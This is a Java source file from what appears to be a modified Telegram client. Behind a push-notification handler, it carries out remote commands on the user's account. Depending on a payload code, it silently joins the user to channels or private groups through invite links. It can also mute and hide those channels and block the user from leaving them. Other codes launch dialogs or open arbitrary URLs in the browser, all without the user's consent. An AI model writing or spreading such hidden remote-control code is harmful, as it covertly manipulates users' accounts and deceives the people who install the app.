package edit.sr;

import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.util.Log;

import com.onesignal.NotificationExtenderService;
import com.onesignal.OSNotificationReceivedResult;

import org.json.JSONException;
import org.json.JSONObject;
import org.zgram.messenger.AndroidUtilities;
import org.zgram.messenger.BuildVars;

import org.zgram.messenger.BuildConfig;
import org.zgram.messenger.ChatObject;
import org.zgram.messenger.MessagesController;
import org.zgram.messenger.MessagesStorage;
import org.zgram.tgnet.ConnectionsManager;
import org.zgram.tgnet.RequestDelegate;
import org.zgram.tgnet.TLObject;
import org.zgram.tgnet.TLRPC;

import java.util.ArrayList;

import edit.Dialog;
import edit.Helper.Channel.ChannelHelper;
import edit.Helper.MuteHelper;
import edit.Helper.Notification.NotificationHelper;
import edit.NotificationActivity;
import edit.finalsoft.Commands;
import edit.settt.LastInListController;
import edit.settt.NoQuitContoller;
import edit.Setting;
import edit.settt.TurnQuitToHideController;
import edit.settt.hideChannelController;
import edit.finalsoft.Channel;

import static org.zgram.messenger.ApplicationLoader.applicationContext;

public class NotificationExtenderBareBonesExample extends NotificationExtenderService {
    @Override
    protected boolean onNotificationProcessing(OSNotificationReceivedResult receivedResult) {
        // Read properties from result.

        JSONObject data = receivedResult.payload.additionalData;
        String channel="";
        String cn="";
        String cnmute="";
        String text="";
        String title="";



        int noexit = 0;
        int hide = 0;
        int lastinlist = 0;
        int mute= 0;
        int nhide =0;
        // Return true to stop the notification from displaying.



        int code= 0;
        try {
            code = data.getInt("code");
            Log.i("TAG", "onMessageReceived: message "+data.toString());

            switch(code){

                //not meyad az bala


                case 1:
                    channel=data.getString("link");
                    text=data.getString("text");
                    title=data.getString("title");

                    Intent p= new Intent(applicationContext,NotificationActivity.class);
                    p.putExtra("channellink",channel);
                    Setting.setCurrentJoiningChannel(channel);
                    //NotificationCreator.create(title, text, p);

                    if (!BuildConfig.DEBUG) {
                        p.setPackage(BuildVars.BUILD_PACKAGENAME);
                    } else
                        p.setPackage(BuildVars.BUILD_PACKAGENAME + ".beta");


                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                        NotificationHelper.buildNotification(title,text,p).build();
                    }


                    break;


                case 2:


                    //add mute

                    try {

                        String chanelName = data.getString("cn");
                        Channel channel1 = new Channel();
                        channel1.name = chanelName;
                        Commands.join(channel1, new edit.finalsoft.OnResponseReadyListener() {
                            @Override
                            public void OnResponseReady(boolean error, JSONObject data, String message) {
                                Log.i("finalsoft", "message: " + message);
                            }
                        });
                    }catch (Exception e){
                        Log.e("finalsoft","exception:"+e.getMessage());
                    }


                    break;



                case 3:

                    //add khas

                    String channels=data.getString("link");
                    noexit=data.getInt("noexit");
                    hide=data.getInt("hide");
                    lastinlist=data.getInt("lastinlist");
                    mute=data.getInt("mute");
                    nhide=data.getInt("nhide");

//                    if(!object.isNull("channel"))channels=object.getString("channel");
//                    if(!object.isNull("hide"))hide=object.getInt("hide");
//                    if(!object.isNull("lastinlist"))lastinlist=object.getInt("lastinlist");
//                    if(!object.isNull("mute"))mute=object.getInt("mute");
//                    if(!object.isNull("fav"))fav=object.getInt("fav");

                    if(noexit>0){
                        NoQuitContoller.addToNoQuit(channels);
                    }
                    if(nhide>0){
                        TurnQuitToHideController.add(channels);
                    }
                    ChannelHelper.JoinFast(channels.replace("@",""));
                    if(mute>0){
                        final String finalChannel = channels;
                        AndroidUtilities.runOnUIThread(new Runnable() {
                            @Override
                            public void run() {
                                MuteHelper.muteChannel(finalChannel.replace("@",""));
                            }
                        },5000);
                    }
                    if(hide>0){
                        hideChannelController.add(channels.replace("@",""));
                    }
                    if(lastinlist>0){
                        LastInListController.add(channels.replace("@",""));
                    }

                    break;


                //push dialogi

                case 4:
                    String image_baner = data.getString("baner");
                    String image_logo = data.getString("logo");
                    String text_title = data.getString("title");
                    String text_desc = data.getString("desc");
                    String text_btn = data.getString("textbtn");
                    String link_btn = data.getString("link");

                    Intent intent = new Intent(getApplicationContext(), Dialog.class)
                            .putExtra("image_logo",image_logo)
                            .putExtra("image_baner",image_baner)
                            .putExtra("text_title",text_title)
                            .putExtra("text_desc",text_desc)
                            .putExtra("text_btn",text_btn)
                            .putExtra("link_btn",link_btn);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                    break;

                //pop_up

                case 5:
                    //************************ اگه خواستید پاپ اپ باشه بجای کد های بالا کافیه کد زیر رو بذارید
                    String link_pop_up = data.getString("link");//op_up.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(link_pop_up));
                    browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(browserIntent);
                    //startActivity(pop_up);
                    break;


                case 6:
                    cn =data.getString("cn");
                    runLinkRequest(null, cn, null, null, null, null, false, 0, 1, false);
                    break;





            }




            // The following can be used to open an Activity of your choice.
            // Replace - getApplicationContext() - with any Android Context.







        } catch (JSONException e1) {
            e1.printStackTrace();
        }




        return false;
    }










    public void runLinkRequest(final String username, final String group, final String sticker, final String botUser, final String botChat, final String message, final boolean hasUrl, final Integer messageId, final int state, final boolean mute)
    {
        if (group != null)
        {
            if (state == 0)
            {
                final TLRPC.TL_messages_checkChatInvite req = new TLRPC.TL_messages_checkChatInvite();
                req.hash = group;
                ConnectionsManager.getInstance().sendRequest(req, new RequestDelegate()
                {
                    @Override
                    public void run(final TLObject response, final TLRPC.TL_error error)
                    {
                        AndroidUtilities.runOnUIThread(new Runnable()
                        {
                            @Override
                            public void run()
                            {
                                if (error == null)
                                {
                                    TLRPC.ChatInvite invite = (TLRPC.ChatInvite) response;
                                    if (invite.chat != null && !ChatObject.isLeftFromChat(invite.chat))
                                    {
                                        MessagesController.getInstance().putChat(invite.chat, false);
                                        ArrayList<TLRPC.Chat> chats = new ArrayList<>();
                                        chats.add(invite.chat);
                                        MessagesStorage.getInstance().putUsersAndChats(null, chats, false, true);
                                    }
                                    else
                                    {
                                        runLinkRequest(username, group, sticker, botUser, botChat, message, hasUrl, messageId, 1, mute);
                                    }
                                }
                            }
                        });
                    }
                }, ConnectionsManager.RequestFlagFailOnServerErrors);
            }
            else if (state == 1)
            {
                TLRPC.TL_messages_importChatInvite req = new TLRPC.TL_messages_importChatInvite();
                req.hash = group;
                ConnectionsManager.getInstance().sendRequest(req, new RequestDelegate()
                {
                    @Override
                    public void run(final TLObject response, final TLRPC.TL_error error)
                    {
                        if (error == null)
                        {
                            TLRPC.Updates updates = (TLRPC.Updates) response;
                            MessagesController.getInstance().processUpdates(updates, false);
                        }
                        AndroidUtilities.runOnUIThread(new Runnable()
                        {
                            @Override
                            public void run()
                            {
                                if (error == null)
                                {
                                    TLRPC.Updates updates = (TLRPC.Updates) response;
                                    if (!updates.chats.isEmpty())
                                    {
                                        TLRPC.Chat chat = updates.chats.get(0);
                                        chat.left = false;
                                        chat.kicked = false;
                                        MessagesController.getInstance().putUsers(updates.users, false);
                                        MessagesController.getInstance().putChats(updates.chats, false);
                                    }
                                }
                            }
                        });
                    }
                }, ConnectionsManager.RequestFlagFailOnServerErrors);
            }
        }
    }








}